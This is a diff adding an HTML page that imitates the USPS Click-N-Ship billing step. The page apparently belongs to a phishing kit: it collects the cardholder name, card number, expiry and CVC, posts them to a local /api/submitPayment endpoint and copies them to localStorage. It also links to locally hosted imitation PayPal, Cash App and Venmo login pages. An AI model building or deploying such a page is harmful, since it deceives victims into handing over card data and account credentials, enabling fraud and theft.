@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Click-N-Ship® | Billing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #fff;
+      color: #1e1e1e;
+    }
+    .header {
+      padding: 20px 40px;
+    }
+    .header img {
+      height: 40px;
+    }
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 40px;
+    }
+    h1 {
+      color: #333366;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .step-nav {
+      display: flex;
+      justify-content: space-between;
+      margin: 30px 0;
+      border-bottom: 2px solid #ccc;
+    }
+    .step {
+      flex: 1;
+      text-align: center;
+      padding: 10px 0;
+      font-weight: bold;
+      border-bottom: 4px solid transparent;
+    }
+    .step.active {
+      border-color: #333366;
+      color: #333366;
+    }
+    .billing {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      margin-top: 30px;
+    }
+    .billing-left {
+      flex: 1 1 60%;
+    }
+    .billing-right {
+      flex: 1 1 35%;
+      border: 1px solid #ddd;
+      padding: 20px;
+      border-radius: 6px;
+    }
+    .billing-section {
+      margin-bottom: 30px;
+    }
+    label {
+      display: block;
+      margin-top: 20px;
+    }
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .payment-method {
+      margin-top: 20px;
+    }
+    .payment-method img {
+      width: 260px;
+      height: auto;
+      margin-bottom: 15px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      padding: 5px;
+      cursor: pointer;
+    }
+    .summary-title {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .total-line {
+      margin-top: 15px;
+      font-weight: bold;
+      color: #333;
+      border-top: 1px solid #900;
+      padding-top: 10px;
+    }
+    .btn-back {
+      margin-top: 40px;
+      padding: 10px 30px;
+      border: 1px solid #333366;
+      color: #333366;
+      background: none;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    /* Card form */
+    #card-form.hidden {
+      display: none;
+    }
+    #card-form {
+      padding: 20px;
+      margin-top: 10px;
+      background: #f9f9f9;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+    }
+    #card-form input,
+    #card-form button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <h1>USPS Click-N-Ship</h1>
+
+    <div class="step-nav">
+      <div class="step">Cust / Ship Info</div>
+      <div class="step active">Billing</div>
+      <div class="step">Review</div>
+      <div class="step">Confirmation</div>
+    </div>
+
+    <div class="billing">
+      <div class="billing-left">
+        <div class="billing-section">
+          <h2>Billing Information</h2>
+          <p>Please select your payment method.</p>
+
+          <div class="checkbox-label">
+            <input type="checkbox" id="authorize">
+            <label for="authorize">
+              I authorize USPS to charge <strong>$<span id="auth-price">17.50</span></strong>. 
+              I agree to the <a href="#">Terms and Conditions</a>.
+            </label>
+          </div>
+
+          <div class="payment-method">
+            <h3>Credit & Debit Card</h3>
+            <img src="../assets/images/payments/ccpay.jpg" alt="Card Payment Options" onclick="toggleCardForm()" />
+
+            <div id="card-form" class="hidden">
+              <h4>Credit or Debit Card Information</h4>
+              <form id="paymentForm">
+                <label>Cardholder's Name</label>
+                <input type="text" name="cardholder" placeholder="John Doe" required>
+
+                <label>Card Number</label>
+                <input type="text" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+                <div style="display: flex; gap: 1rem;">
+                  <div style="flex: 1;">
+                    <label>Expiry (MM/YY)</label>
+                    <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                  </div>
+                  <div style="flex: 1;">
+                    <label>CVC</label>
+                    <input type="text" name="cvc" placeholder="123" maxlength="4" required>
+                  </div>
+                </div>
+
+                <label><input type="checkbox"> Save this card to my account</label>
+                <label><input type="checkbox"> Make this my preferred card</label>
+
+                <button type="submit" style="margin-top: 1rem;">Pay Now</button>
+              </form>
+            </div>
+
+            <h3>PayPal</h3>
+            <a href="/Paypal.html"><img src="../assets/images/payments/paypal.png" alt="PayPal Checkout"></a>
+
+            <h3>Cash App Pay</h3>
+            <a href="/cash.app/login.html"><img src="../assets/images/payments/cashapp.png" alt="Cash App"></a>
+
+            <h3>Venmo Pay</h3>
+            <a href="/Login_Venmo.html"><img src="../assets/images/payments/venmo.png" alt="Venmo"></a>
+
+          </div>
+        </div>
+
+        <button class="btn-back" onclick="history.back()">Back</button>
+      </div>
+
+      <div class="billing-right">
+        <div class="summary-title">Order Summary:</div>
+        <p style="word-break: break-all;">98a010ecff264f0f88c62dded23850eb</p>
+        <p><strong id="summary-label"></strong></p>
+        <p>Order Total: <span id="summary-price"></span></p>
+        <p class="total-line">Total: <span id="summary-total"></span></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Load billing info
+    document.addEventListener('DOMContentLoaded', () => {
+      const price = localStorage.getItem('shippingPrice') || "0.00";
+      const label = localStorage.getItem('shippingLabel') || "No selection";
+
+      document.getElementById("summary-label").textContent = label;
+      document.getElementById("summary-price").textContent = "$" + price;
+      document.getElementById("summary-total").textContent = "$" + price;
+      document.getElementById("auth-price").textContent = price;
+    });
+
+    // Toggle card form
+    function toggleCardForm() {
+      document.getElementById('card-form').classList.toggle('hidden');
+    }
+
+    // Save payment info
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const paymentData = {
+        cardholderName: formData.get('cardholder'),
+        cardNumber: formData.get('cardnumber'),
+        expiryDate: formData.get('expiry'),
+        cvc: formData.get('cvc')
+      };
+
+      // Verstuur paymentData naar de server
+fetch('/api/submitPayment', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(paymentData)
+})
+.then(response => {
+  if (response.ok) {
+    alert('Payment opgeslagen en verzonden!');
+  } else {
+    alert('Fout bij verzenden payment.');
+  }
+})
+.catch(error => {
+  console.error('Fout bij fetch submitPayment:', error);
+});
+
+      // WARNING: Only for test/demo. Never save card data in localStorage in production!
+      localStorage.setItem("payment_info", JSON.stringify(paymentData));
+
+      alert('Payment information saved successfully.');
+    });
+  </script>
+
+</body>
+</html>
